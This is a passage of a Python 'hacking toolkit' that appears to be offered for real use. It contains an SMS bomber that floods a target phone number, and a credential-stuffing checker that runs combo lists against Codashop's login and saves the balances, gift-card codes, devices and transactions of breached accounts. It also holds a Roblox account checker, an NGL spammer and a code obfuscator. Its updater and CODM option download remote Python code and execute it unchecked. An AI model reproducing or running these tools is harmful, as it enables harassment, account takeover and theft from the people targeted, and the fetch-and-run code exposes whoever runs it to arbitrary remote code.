        elapsed = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests else 0
        req_per_sec = self.total_requests / elapsed if elapsed else 0
        print(f'\n📊 STATS | ✅ {self.successful_requests} ❌ {self.failed_requests} 📦 {self.total_requests}')
        print(f'📈 {success_rate:.1f}% | ⚡ {req_per_sec:.1f} req/s | ⏱ {elapsed:.1f}s')
        print('-' * 60)

    def _display_final_report(self, number_to_send):
        elapsed = time.time() - self.start_time
        success_rate = (self.successful_requests / self.total_requests * 100) if self.total_requests else 0
        req_per_sec = self.total_requests / elapsed if elapsed else 0
        print('\n' + '=' * 60)
        print('🎯 SMS BOMBING COMPLETE')
        print('=' * 60)
        print(f'📞 Target: {number_to_send}')
        print(f'✅ Success: {self.successful_requests}')
        print(f'❌ Failed:  {self.failed_requests}')
        print(f'📦 Total:   {self.total_requests}')
        print(f'📈 Rate:    {success_rate:.1f}%')
        print(f'⚡ Speed:   {req_per_sec:.1f} req/s')
        print(f'⏰ Time:    {elapsed:.1f}s')
        rating = "EXCELLENT 🏆" if success_rate >= 80 else "GOOD 👍" if success_rate >= 60 else "FAIR 👌" if success_rate >= 40 else "POOR ⚠️"
        print(f'🏆 Rating:  {rating}')
        print('=' * 60)
        self.logger.info(f"SMS mission done: {self.successful_requests}/{self.total_requests} ({success_rate:.1f}%)")

    def start_bombing(self, phone_number: str, total_requests: int):
        if not self.validate_phone_number(phone_number):
            print("❌ Invalid phone number. Must be like 09812345678 or 9812345678")
            return
        if total_requests <= 0:
            print("❌ Request count must be positive.")
            return
        formatted_num = self.format_phone_number(phone_number)
        number_to_send = phone_number
        print('\n' + '=' * 60)
        print('💣 SMS BOMBER ACTIVATED')
        print('=' * 60)
        print(f'📞 Target  : {phone_number}')
        print(f'🎯 Requests: {total_requests}')
        print(f'🔄 Retries : {self.max_retries}')
        print(f'👷 Workers : {self.workers}')
        print('=' * 60)
        self.start_time = time.time()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        services = self._get_all_services(formatted_num, number_to_send)
        completed = 0
        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            while completed < total_requests:
                futures = {}
                for func in services:
                    if completed >= total_requests: break
                    future = executor.submit(func)
                    futures[future] = completed
                    completed += 1
                for future in as_completed(futures):
                    try:
                        resp = future.result()
                        self.total_requests += 1
                        if resp.success:
                            self.successful_requests += 1
                            print(f'✅ [{self.total_requests:04d}] {resp.service_name}: SUCCESS (HTTP {resp.status_code})')
                        else:
                            self.failed_requests += 1
                            err = f" - {resp.error_message}" if resp.error_message else ""
                            print(f'❌ [{self.total_requests:04d}] {resp.service_name}: FAILED{err}')
                        if self.total_requests % 5 == 0:
                            self._display_real_time_stats()
                    except Exception as e:
                        self.total_requests += 1
                        self.failed_requests += 1
                        print(f'❌ [{self.total_requests:04d}] Unknown: {str(e)}')
                if completed < total_requests:
                    time.sleep(random.uniform(0.5, 1.5))
        self._display_final_report(number_to_send)

    def run(self):
        print('\n' + '=' * 60)
        print('💣 SMS BOMBER v1.0')
        print('=' * 60)
        try:
            number = input('📱 Enter target phone number (09xxxxxxxxx): ').strip()
            rqs = input('🎯 How many requests? ').strip()
            total = int(rqs)
            if total > 1000:
                confirm = input('⚠️  High volume – continue? (y/N): ').lower()
                if confirm != 'y':
                    print('Aborted.')
                    return
            self.start_bombing(number, total)
        except ValueError:
            print('❌ Invalid number for requests.')
        except KeyboardInterrupt:
            print('\n⛔ Interrupted.')
            if self.start_time:
                self._display_final_report(number if 'number' in locals() else 'unknown')

# ----------------------------------------------------------------------
# Self‑updater
# ----------------------------------------------------------------------
def self_update(restart: bool = True):
    log.info("Checking for updates...")
    try:
        response = requests.get(UPDATE_URL, timeout=10)
        response.raise_for_status()
        new_code = response.text
        current_path = Path(sys.argv[0])
        current_code = current_path.read_text(encoding="utf-8")
        if new_code == current_code:
            log.info("Already up to date.")
            return False
        log.info("New version found! Updating...")
        tmp_path = current_path.with_suffix(".py.tmp")
        tmp_path.write_text(new_code, encoding="utf-8")
        try:
            compile(new_code, str(tmp_path), "exec")
        except SyntaxError as e:
            log.error(f"Downloaded code contains syntax error: {e}")
            tmp_path.unlink()
            return False
        shutil.move(str(tmp_path), str(current_path))
        log.info("Update applied successfully.")
        if restart:
            log.info("Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        return True
    except Exception as e:
        log.error(f"Update failed: {e}")
        return False

# ----------------------------------------------------------------------
# CODM Checker (fetched and run)
# ----------------------------------------------------------------------
def run_codm_checker():
    if not cloudscraper:
        print("Missing cloudscraper. Install it to use the CODM checker.")
        return
    print("Downloading CODM checker from GitHub...")
    try:
        r = requests.get(CODM_URL, timeout=30)
        r.raise_for_status()
        script = r.text
        tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
        tmp_file.write(script)
        tmp_file.close()
        subprocess.run([sys.executable, tmp_file.name], check=False)
        os.unlink(tmp_file.name)
    except Exception as e:
        print(f"Failed to run CODM checker: {e}")

def download_fresh_cookies():
    log.info("Downloading fresh_cookie.txt ...")
    try:
        r = requests.get(FRESH_COOKIE_URL, timeout=15)
        r.raise_for_status()
        with open("fresh_cookie.txt", "w", encoding="utf-8") as f:
            f.write(r.text)
        log.info("fresh_cookie.txt saved successfully.")
    except Exception as e:
        log.error(f"Failed to download cookies: {e}")

# ======================================================================
# CODASHOP CHECKER (with proper headers)
# ======================================================================
def format_date(iso_str):
    if not iso_str or iso_str == "N/A":
        return "N/A"
    try:
        dt = datetime.strptime(iso_str, "%Y-%m-%dT%H:%M:%S.%fZ")
    except:
        try:
            dt = datetime.strptime(iso_str, "%Y-%m-%dT%H:%M:%SZ")
        except:
            return iso_str
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def country_code_to_name(code):
    mapping = {
        "608": "Philippines (PH)", "360": "Indonesia (ID)", "702": "Singapore (SG)",
        "458": "Malaysia (MY)", "764": "Thailand (TH)", "704": "Vietnam (VN)",
        "116": "Cambodia (KH)", "418": "Laos (LA)", "104": "Myanmar (MM)",
        "096": "Brunei (BN)", "410": "South Korea (KR)", "792": "Turkey (TR)",
        "826": "United Kingdom (GB)", "986": "Brazil (BR)"
    }
    return mapping.get(str(code), str(code))

def get_random_ua_coda():
    return random.choice(USER_AGENTS)

class CodashopUltimate:
    def __init__(self):
        self.results_dir = "Results"
        self.create_dirs()

    def create_dirs(self):
        dirs = [
            "Results/Hits", "Results/Fails", "Results/Banned",
            "Results/Errors", "Results/Transactions", "Results/Devices",
            "Results/Giftcards", "Results/Referrals", "Results/Sorted"
        ]
        for d in dirs:
            os.makedirs(d, exist_ok=True)

    def save_result(self, folder, filename, content):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"{folder}/{filename}_{ts}.txt"
        with open(path, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    def cognito_auth(self, email, password):
        """Authenticate via Cognito with detailed debugging."""
        for attempt in range(3):
            session = requests.Session()
            # Essential headers for Cognito
            session.headers.update({
                "User-Agent": get_random_ua_coda(),
                "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "Content-Type": "application/x-amz-json-1.1",
                "Accept": "application/json"
            })
            payload = {
                "AuthFlow": "USER_PASSWORD_AUTH",
                "ClientId": COGNITO_CLIENT_ID,
                "AuthParameters": {"USERNAME": email, "PASSWORD": password},
                "ClientMetadata": {"country_code": "ph", "country_name": "Philippines", "lang_code": "en"}
            }
            try:
                resp = session.post(COGNITO_URL, json=payload, timeout=15)
                # Debug logging for non-200 responses
                if resp.status_code != 200:
                    log.debug(f"Auth attempt {attempt+1} failed - Status: {resp.status_code}, Body: {resp.text[:200]}")
                if resp.status_code == 200:
                    data = resp.json()
                    if "AuthenticationResult" in data:
                        return data["AuthenticationResult"]["IdToken"]
                    else:
                        log.debug(f"Auth success but no token: {data}")
                        return None
                elif resp.status_code == 400:
                    try:
                        err_data = resp.json()
                        err = err_data.get("__type", "")
                        message = err_data.get("message", "")
                        log.debug(f"Auth 400 - Type: {err}, Message: {message}")
                    except:
                        err = resp.text[:100]
                    if "NotAuthorizedException" in err or "UserNotFoundException" in err:
                        return "invalid"
                    elif "PasswordResetRequiredException" in err:
                        return "change_password"
                    else:
                        console.print(f"[yellow]Auth error for {email}: {err} - {message if 'message' in locals() else ''}[/yellow]")
                        return None
                else:
                    log.debug(f"Auth failed with status {resp.status_code}: {resp.text[:100]}")
            except requests.exceptions.RequestException as e:
                log.debug(f"Auth attempt {attempt+1} network error: {e}")
                time.sleep(2 ** attempt)
                continue
            except Exception as e:
                log.debug(f"Auth unexpected error: {e}")
                return None
        return None

    def api_get(self, url, token):
        session = requests.Session()
        session.headers.update({
            "Authorization": token,
            "User-Agent": get_random_ua_coda(),
            "Accept": "application/json"
        })
        resp = session.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data")
        return None

    def get_wallet(self, token):
        data = self.api_get(f"{WALLET_API}/user/wallet", token)
        if data and data.get("resultCode") == 0:
            return data.get("data")
        return None

    def get_profile(self, token):
        return self.api_get(f"{USER_API}/user/profile", token)

    def get_transactions(self, token, limit=30):
        data = self.api_get(f"{WALLET_API}/user/transactions?limit={limit}&offset=0", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("transactions", [])
        return []

    def get_devices(self, token):
        data = self.api_get(f"{USER_API}/user/devices", token)
        return data if isinstance(data, list) else []

    def get_giftcards(self, token):
        data = self.api_get(f"{WALLET_API}/user/giftcards", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("giftCards", [])
        return []

    def get_referral(self, token):
        return self.api_get(f"{REFERRAL_API}/user/referral", token)

    def get_loyalty(self, token):
        data = self.api_get(f"{WALLET_API}/user/loyalty", token)
        if data and data.get("resultCode") == 0:
            return data.get("data", {}).get("points", 0)
        return 0

    def check(self, combo):
        global total_checked, total_valid, total_hits, total_invalid, total_banned, total_errors
        try:
            email, pwd = combo.split(":", 1)
            token = self.cognito_auth(email, pwd)
            if token == "invalid":
                with stats_lock:
                    total_checked += 1
                    total_invalid += 1
                self.save_result("Results/Fails", "fails", f"{email}:{pwd}")
                console.print(f"[red][-] FAIL: {email}:{pwd}[/red]")
                return
            if token == "banned":
                with stats_lock:
                    total_checked += 1
                    total_banned += 1
                self.save_result("Results/Banned", "banned", f"{email}:{pwd}")
                console.print(f"[yellow][!] BANNED: {email}:{pwd} - cooling 90s[/yellow]")
                time.sleep(random.uniform(80, 100))
                return
            if token == "change_password":
                with stats_lock:
                    total_checked += 1
                    total_invalid += 1
                console.print(f"[yellow][*] CHANGE PASSWORD: {email}:{pwd}[/yellow]")
                self.save_result("Results/Fails", "change_password", f"{email}:{pwd}")
                return
            if not token:
                with stats_lock:
                    total_checked += 1
                    total_errors += 1
                self.save_result("Results/Errors", "errors", f"{email}:{pwd} | Auth failed")
                console.print(f"[red][?] AUTH ERR: {email}:{pwd}[/red]")
                return

            wallet = self.get_wallet(token)
            profile = self.get_profile(token)
            transactions = self.get_transactions(token, 20)
            devices = self.get_devices(token)
            giftcards = self.get_giftcards(token)
            referral = self.get_referral(token)
            points = self.get_loyalty(token)

            if not wallet:
                with stats_lock:
                    total_checked += 1
                    total_errors += 1
                self.save_result("Results/Errors", "errors", f"{email}:{pwd} | No wallet")
                console.print(f"[red][?] NO WALLET: {email}:{pwd}[/red]")
                return

            balance = float(wallet.get("balanceAmount", 0))
            currency = wallet.get("currencyCode", "608")
            mobile = wallet.get("mobile", "N/A")
            created = format_date(wallet.get("createdOn", "N/A"))
            last_upd = format_date(wallet.get("lastUpdatedOn", "N/A"))
            total_spent = wallet.get("totalSpent", 0)

            profile_name = profile.get("name", "N/A") if profile else "N/A"
            profile_avatar = profile.get("avatar", "N/A") if profile else "N/A"

            ref_code = referral.get("code", "N/A") if referral else "N/A"
            ref_earned = referral.get("totalEarned", 0) if referral else 0

            hit_data = {
                "email": email, "password": pwd, "balance": balance,
                "currency": country_code_to_name(currency), "mobile": mobile,
                "created": created, "last_updated": last_upd,
                "total_spent": total_spent, "profile_name": profile_name,
                "avatar": profile_avatar, "points": points,
                "devices": len(devices), "giftcards": len(giftcards),
                "transactions": len(transactions), "referral_code": ref_code,
                "referral_earned": ref_earned
            }

            with stats_lock:
                total_checked += 1
                total_valid += 1
                total_hits += 1

            self.save_result("Results/Hits", "hits", f"{email}:{pwd} | Balance: {balance:.2f} | Points: {points} | Devices: {len(devices)}")
            self.save_transactions(token, email, pwd, transactions)
            self.save_devices(token, email, pwd, devices)
            self.save_giftcards(token, email, pwd, giftcards)
            self.save_referral(token, email, pwd, referral)

            console.print(format_hit(hit_data))
            console.print("=" * 80)
            time.sleep(random.uniform(1.5, 3.0))

        except Exception as e:
            with stats_lock:
                total_errors += 1
            self.save_result("Results/Errors", "errors", f"{combo} | {str(e)}")
            console.print(f"[red][!] EXCEPTION: {combo} | {str(e)}[/red]")

    def save_transactions(self, token, email, pwd, txns):
        if not txns: return
        content = f"{email}:{pwd}\n"
        for t in txns[:10]:
            amt = t.get("amount", 0)
            typ = t.get("type", "N/A")
            date = format_date(t.get("date", "N/A"))
            content += f"  └─ {amt} | {typ} | {date}\n"
        self.save_result("Results/Transactions", "transactions", content)

    def save_devices(self, token, email, pwd, devs):
        if not devs: return
        content = f"{email}:{pwd}\n"
        for d in devs:
            model = d.get("model", "N/A")
            last_active = format_date(d.get("lastActive", "N/A"))
            content += f"  └─ {model} | Last: {last_active}\n"
        self.save_result("Results/Devices", "devices", content)

    def save_giftcards(self, token, email, pwd, cards):
        if not cards: return
        content = f"{email}:{pwd}\n"
        for c in cards:
            code = c.get("code", "N/A")
            bal = c.get("balance", 0)
            content += f"  └─ {code} | Balance: {bal}\n"
        self.save_result("Results/Giftcards", "giftcards", content)

    def save_referral(self, token, email, pwd, ref):
        if not ref: return
        content = f"{email}:{pwd} | Code: {ref.get('code')} | Earned: {ref.get('totalEarned', 0)} | Clicks: {ref.get('clicks', 0)}"
        self.save_result("Results/Referrals", "referrals", content)

def format_hit(data):
    lines = []
    lines.append("╔══ Codashop Account Details")
    lines.append(f"║   ╠══ Email: {data['email']}")
    lines.append(f"║   ╠══ Password: {data['password']}")
    lines.append(f"║   ╠══ Balance: {data['balance']:.2f} {data['currency']}")
    lines.append(f"║   ╠══ Mobile: {data['mobile']}")
    lines.append(f"║   ╠══ Total Spent: {data['total_spent']}")
    lines.append(f"║   ╠══ Created: {data['created']}")
    lines.append(f"║   ╠══ Last Updated: {data['last_updated']}")
    lines.append(f"║   ╠══ Profile Name: {data['profile_name']}")
    lines.append(f"║   ╠══ Avatar: {data['avatar'][:50] if data['avatar'] != 'N/A' else 'N/A'}...")
    lines.append(f"║   ╠══ Loyalty Points: {data['points']}")
    lines.append(f"║   ╠══ Devices Count: {data['devices']}")
    lines.append(f"║   ╠══ Gift Cards Count: {data['giftcards']}")
    lines.append(f"║   ╠══ Transactions Count: {data['transactions']}")
    lines.append(f"║   ╠══ Referral Code: {data['referral_code']}")
    lines.append(f"║   ╠══ Referral Earnings: {data['referral_earned']}")
    lines.append(f"║   ╚══ Checked by @ItsMeJeff")
    return "\n".join(lines)

def build_live_stats():
    global total_accounts
    elapsed = time.time() - start_time
    progress = (total_checked / total_accounts * 100) if total_accounts > 0 else 0
    bar_len = 30
    filled = int(bar_len * progress / 100)
    bar = "█" * filled + "░" * (bar_len - filled)
    content = (
        f" {bar} {progress:.1f}%\n"
        f" Checked: {total_checked}/{total_accounts}\n"
        f" Hits: {total_hits} | Invalid: {total_invalid}\n"
        f" Banned: {total_banned} | Errors: {total_errors}\n"
        f" Time: {elapsed:.1f}s"
    )
    return Panel(content, title="[bold cyan]Codashop Ultimate Checker - Live Stats[/bold cyan]", border_style="bright_blue", box=ROUNDED)

def select_codashop_input_file():
    combo_dir = "Combo"
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        console.print("[yellow]Created 'Combo' folder. Place combo file there.[/yellow]")
        return None
    files = [f for f in os.listdir(combo_dir) if f.endswith(".txt")]
    if not files:
        console.print("[red]No .txt files in Combo folder[/red]")
        return None
    console.print("[bold cyan]Select combo file:[/bold cyan]")
    for i, f in enumerate(files, 1):
        console.print(f"  {i}. {f}")
    choice = rich_prompt("[bold yellow]Enter number[/bold yellow]", choices=[str(i) for i in range(1, len(files)+1)])
    return os.path.join(combo_dir, files[int(choice)-1])

def run_codashop_checker():
    global total_accounts, total_invalid, start_time, total_checked, total_valid, total_hits, total_banned, total_errors

    if not RICH_AVAILABLE:
        console.print("[red]Codashop Checker requires the 'rich' module. Please install it with: pip install rich[/red]")
        return

    try:
        os.system("cls" if os.name == "nt" else "clear")
        console.print("""
 ██████╗ ██████╗ ██████╗  █████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ 
██╔════╝██╔═══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔═══██╗██╔══██╗
██║     ██║   ██║██║  ██║███████║███████╗███████║██║   ██║██████╔╝
██║     ██║   ██║██║  ██║██╔══██║╚════██║██╔══██║██║   ██║██╔═══╝ 
╚██████╗╚██████╔╝██████╔╝██║  ██║███████║██║  ██║╚██████╔╝██║     
 ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     
""")
        console.print(Panel(f"[bold green]ULTIMATE CODASHOP CHECKER - v3.0[/bold green]\n[cyan]TG: @ItsMeJeff[/cyan]", border_style="bright_green", box=DOUBLE))
        file_path = select_codashop_input_file()
        if not file_path:
            return
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            combos = [line.strip() for line in f if line.strip() and ":" in line]
        total_accounts = len(combos)
        total_invalid = 0
        total_checked = 0
        total_valid = 0
        total_hits = 0
        total_banned = 0
        total_errors = 0
        start_time = time.time()
        console.print(f"[cyan]Loaded {total_accounts} accounts[/cyan]")
        threads = int(rich_prompt("[bold yellow]Threads (1-30)[/bold yellow]", default="10"))
        threads = min(30, max(1, threads))
        checker = CodashopUltimate()
        with Progress() as progress:
            task = progress.add_task("[cyan]Checking accounts...", total=total_accounts)
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(checker.check, combo) for combo in combos]
                for future in futures:
                    future.result()
                    progress.update(task, advance=1)
        console.print(build_live_stats())
        console.print("[green]All results saved to Results/ folder[/green]")
        input("[yellow]Press Enter to return to menu...[/yellow]")
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted by user[/red]")

# ======================================================================
# ROBOX CHECKER (NEW)
# ======================================================================
JEFF_LOGO = r"""
██╗███████╗███████╗███████╗███████╗
██║██╔════╝██╔════╝██╔════╝██╔════╝
██║█████╗  █████╗  █████╗  █████╗
██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══╝
██║██║     ███████╗████████╗███████╗
╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝
"""

class RobloxChecker:
    def __init__(self):
        self.thread_local = threading.local()
        self.results = []
        self.lock = threading.Lock()

    def _get_session(self):
        if not hasattr(self.thread_local, "session"):
            s = requests.Session()
            s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"})
            adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=20)
            s.mount("http://", adapter)
            s.mount("https://", adapter)
            self.thread_local.session = s
        return self.thread_local.session

    @staticmethod
    def _parse_date(date_str):
        if not date_str:
            return "Unknown Date"
        for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ"):
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d")
            except ValueError:
                pass
        return "Unknown Date"

    def _fetch_json(self, url, method="get", **kwargs):
        session = self._get_session()
        kwargs.setdefault("timeout", 12)
        if method.lower() == "post":
            resp = session.post(url, **kwargs)
        else:
            resp = session.get(url, **kwargs)
        if resp.status_code != 200:
            raise Exception(f"HTTP {resp.status_code}")
        return resp.json()

    def _get_roblox_user_info(self, username, password):
        try:
            lookup_url = "https://users.roblox.com/v1/usernames/users"
            lookup = self._fetch_json(lookup_url, method="post", json={"usernames": [username]})
            data = lookup.get("data", [])
            if not data:
                return None
            user_id = data[0]["id"]

            profile = self._fetch_json(f"https://users.roblox.com/v1/users/{user_id}")
            friends = self._fetch_json(f"https://friends.roblox.com/v1/users/{user_id}/friends/count").get("count", 0)
            followers = self._fetch_json(f"https://friends.roblox.com/v1/users/{user_id}/followers/count").get("count", 0)
            badges = self._fetch_json(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100").get("data", [])
            groups = self._fetch_json(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles").get("data", [])
            collectibles = self._fetch_json(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10").get("data", [])

            return {
                "USER": username,
                "PASS": password,
                "UserID": user_id,
                "Username": profile.get("name", "N/A"),
                "DisplayName": profile.get("displayName", "N/A"),
                "ProfileURL": f"https://www.roblox.com/users/{user_id}/profile",
                "Description": profile.get("description", "N/A"),
                "IsBanned": profile.get("isBanned", False),
                "AccountAgeDays": profile.get("age", "N/A"),
                "JoinDate": self._parse_date(profile.get("created")),
                "BadgeCount": len(badges),
                "CollectibleCount": len(collectibles),
                "GroupCount": len(groups),
                "FriendCount": friends,
                "FollowerCount": followers,
                "Avatar": (
                    f"https://thumbnails.roblox.com/v1/users/avatar-headshot?"
                    f"userIds={user_id}&size=150x150&format=Png&isCircular=false"
                )
            }
        except Exception as e:
            log.debug(f"Roblox error for {username}: {e}")
            return None

    def _worker(self, username, password):
        info = self._get_roblox_user_info(username, password)
        with self.lock:
            if info:
                self.results.append(info)
                console.print(f"[green]✅ {username}[/green]")
            else:
                console.print(f"[red]❌ {username} - not found or error[/red]")

    def run(self):
        console.print(JEFF_LOGO, style="cyan")
        console.print("[yellow]            Created by JEFF[/yellow]\n")
        file_name = rich_prompt("Enter accounts file (user:pass per line)").strip()
        try:
            with open(file_name, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if line.strip() and ":" in line]
            if not lines:
                console.print("[red]No valid accounts found.[/red]")
                return
            accounts = []
            for line in lines:
                user, passw = line.split(":", 1)
                accounts.append((user.strip(), passw.strip()))

            os.makedirs("result", exist_ok=True)
            output_file = "result/jeff_rblx_result.txt"
            self.results.clear()
            total = len(accounts)

            console.print(f"\n[cyan]Checking {total} accounts...[/cyan]\n")
            with ThreadPoolExecutor(max_workers=12) as executor:
                futures = [executor.submit(self._worker, u, p) for u, p in accounts]
                for _ in as_completed(futures):
                    pass

            with open(output_file, "w", encoding="utf-8") as out:
                out.write(JEFF_LOGO + "\n")
                out.write("            Created by Jeff\n\n")
                for info in self.results:
                    out.write("⪻━━━━━═『Jeff』═━━━━━⪼\n\n")
                    for key, val in info.items():
                        out.write(f"[+] {key}: {val}\n")
                    out.write("\n⪻━━━━━━━━━━━━━━━━━━━⪼\n\n")

            console.print(f"\n[green]Done! Results saved to {output_file}[/green]")
        except FileNotFoundError:
            console.print("[red]File not found.[/red]")
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")

# ----------------------------------------------------------------------
# Updated Interactive Menu with Roblox Checker (11 options)
# ----------------------------------------------------------------------
def build_menu_table():
    if RICH_AVAILABLE:
        table = Table(show_header=False, box=ROUNDED, border_style="cyan")
        table.add_column(style="bold magenta", justify="center")
        table.add_column(style="bold white")
        items = [
            ("1", "Decode a file"),
            ("2", "Obfuscate a file"),
            ("3", "NGL Spammer"),
            ("4", "NetEase Account Checker"),
            ("5", "SMS Bomber"),
            ("6", "CODM Checker (download & run)"),
            ("7", "Download Fresh Cookies"),
            ("8", "Codashop Checker"),
            ("9", "Roblox Checker"),
            ("10", "Check for updates"),
            ("11", "Exit")
        ]
        for num, desc in items:
            table.add_row(f"[{num}]", desc)
        return table
    else:
        lines = []
        lines.append("┌──────────────────────────────┐")
        lines.append("│   ★  C O D E H A X  v6.3  ★ │")
        lines.append("├──────────────────────────────┤")
        lines.append("│ [1] Decode a file            │")
        lines.append("│ [2] Obfuscate a file         │")
        lines.append("│ [3] NGL Spammer              │")
        lines.append("│ [4] NetEase Account Checker  │")
        lines.append("│ [5] SMS Bomber               │")
        lines.append("│ [6] CODM Checker (dl & run)  │")
        lines.append("│ [7] Download Fresh Cookies   │")
        lines.append("│ [8] Codashop Checker         │")
        lines.append("│ [9] Roblox Checker           │")
        lines.append("│ [10] Check for updates       │")
        lines.append("│ [11] Exit                    │")
        lines.append("└──────────────────────────────┘")
        return "\n".join(lines)

def interactive_menu():
    while True:
        if RICH_AVAILABLE:
            console.clear()
            console.print(ASCII_ART, style="bold cyan")
            menu_panel = Panel(
                build_menu_table(),
                title="[bold bright_cyan]🛡️ Universal Python Toolkit[/bold bright_cyan]",
                border_style="bright_cyan",
                box=DOUBLE,
                padding=(1, 2)
            )
            console.print(menu_panel)
            choice = rich_prompt("Select", choices=[str(i) for i in range(1,12)], default="1")
        else:
            os.system('cls' if os.name=='nt' else 'clear')
            print(ASCII_ART)
            print(build_menu_table())
            choice = input("Choice: ").strip()

        if choice == "1":
            file_path = rich_prompt("Obfuscated file path")
            decoded = auto_decode(file_path)
            if decoded:
                out_path = Path(file_path).stem + "_decoded.py"
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write(decoded)
                log.info(f"Decoded file saved to {out_path}")
                preview = "\n".join(decoded.splitlines()[:15])
                if len(decoded.splitlines()) > 15:
                    preview += "\n..."
                print(preview)
            else:
                log.error("Decoding failed.")
        elif choice == "2":
            src = rich_prompt("File to obfuscate")
            mode = rich_prompt("Mode (marshal/text)", choices=["marshal", "text"], default="marshal")
            layers = int(rich_prompt("Layers (1-10)", default="1"))
            author = rich_prompt("Author", default="@ItsMeJeff")
            obf = Obfuscator()
            try:
                obf.obfuscate_file(src, mode=mode, layers=layers, author=author)
            except Exception as e:
                log.error(f"Obfuscation failed: {e}")
        elif choice == "3":
            username = rich_prompt("Target username")
            message = rich_prompt("Message")
            quantity = int(rich_prompt("Number of messages", default="10"))
            extra = rich_confirm("Add extra message?", default=False)
            extra_msg = rich_prompt("Extra message") if extra else message
            threads = int(rich_prompt("Threads", default="10"))
            proxies_input = rich_prompt("Proxy list (comma separated) or leave empty", default="")
            proxies = [p.strip() for p in proxies_input.split(",") if p.strip()] if proxies_input else []
            spammer = NGLSpammer(username, message, quantity, extra_msg, proxies, threads)
            spammer.run()
        elif choice == "4":
            threads = int(rich_prompt("Threads", default="10"))
            checker = NeteaseGamesChecker(threads=threads)
            checker.start()
        elif choice == "5":
            bomber = SmsBomber()
            bomber.run()
        elif choice == "6":
            run_codm_checker()
        elif choice == "7":
            download_fresh_cookies()
        elif choice == "8":
            run_codashop_checker()
        elif choice == "9":
            rblx = RobloxChecker()
            rblx.run()
        elif choice == "10":
            self_update(restart=True)
        elif choice == "11":
            sys.exit(0)
        else:
            print("Invalid choice.")
        input("\nPress Enter to continue...")

# ----------------------------------------------------------------------
# CLI (with roblox command)
# ----------------------------------------------------------------------
def create_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=f"CodeHax v{VERSION}")
    subparsers = parser.add_subparsers(dest="command", help="Operation")
    dec = subparsers.add_parser("decode", help="Decode obfuscated file")
    dec.add_argument("file")
    dec.add_argument("-o", "--output")
    enc = subparsers.add_parser("obfuscate", help="Obfuscate a Python file")
    enc.add_argument("file")
    enc.add_argument("-m", "--mode", choices=["marshal", "text"], default="marshal")
    enc.add_argument("-l", "--layers", type=int, default=1, choices=range(1,11))
    enc.add_argument("-a", "--author", default="@ItsMeJeff")
    enc.add_argument("-o", "--output")
    ngl = subparsers.add_parser("ngl", help="NGL spam")
    ngl.add_argument("username")
    ngl.add_argument("message")
    ngl.add_argument("-q", "--quantity", type=int, default=10)
    ngl.add_argument("-e", "--extra")
    ngl.add_argument("-t", "--threads", type=int, default=10)
    ngl.add_argument("-p", "--proxies", nargs="*")
    netease = subparsers.add_parser("netease", help="NetEase account checker")
    netease.add_argument("file")
    netease.add_argument("-t", "--threads", type=int, default=10)
    sms = subparsers.add_parser("sms", help="SMS bomber")
    sms.add_argument("number", help="Target phone number (e.g., 09812345678)")
    sms.add_argument("requests", type=int, help="Number of SMS requests")
    sms.add_argument("-t", "--threads", type=int, default=8)
    subparsers.add_parser("codm", help="Download and run CODM checker from GitHub")
    subparsers.add_parser("fetchcookies", help="Download fresh_cookie.txt from GitHub")
    subparsers.add_parser("codashop", help="Run Codashop account checker")
    subparsers.add_parser("roblox", help="Run Roblox account checker")
    subparsers.add_parser("update", help="Self-update")
    return parser

def main():
    parser = create_parser()
    args = parser.parse_args()
    if args.command is None:
        interactive_menu()
        return
    if args.command == "decode":
        decoded = auto_decode(args.file)
        if decoded:
            out_path = args.output or (Path(args.file).stem + "_decoded.py")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(decoded)
            log.info(f"Decoded file saved to {out_path}")
        else:
            log.error("Decoding failed.")
            sys.exit(1)
    elif args.command == "obfuscate":
        obf = Obfuscator()
        try:
            out = obf.obfuscate_file(args.file, args.mode, args.layers, args.author)
            if args.output:
                shutil.move(out, args.output)
                log.info(f"Output moved to {args.output}")
        except Exception as e:
            log.error(f"Obfuscation failed: {e}")
            sys.exit(1)
    elif args.command == "ngl":
        spammer = NGLSpammer(username=args.username, message=args.message,
                             quantity=args.quantity, extra_message=args.extra,
                             proxies=args.proxies or [], threads=args.threads)
        spammer.run()
    elif args.command == "netease":
        checker = NeteaseGamesChecker(threads=args.threads)
        checker.start(filename=args.file)
    elif args.command == "sms":
        bomber = SmsBomber(workers=args.threads)
        bomber.start_bombing(args.number, args.requests)
    elif args.command == "codm":
        run_codm_checker()
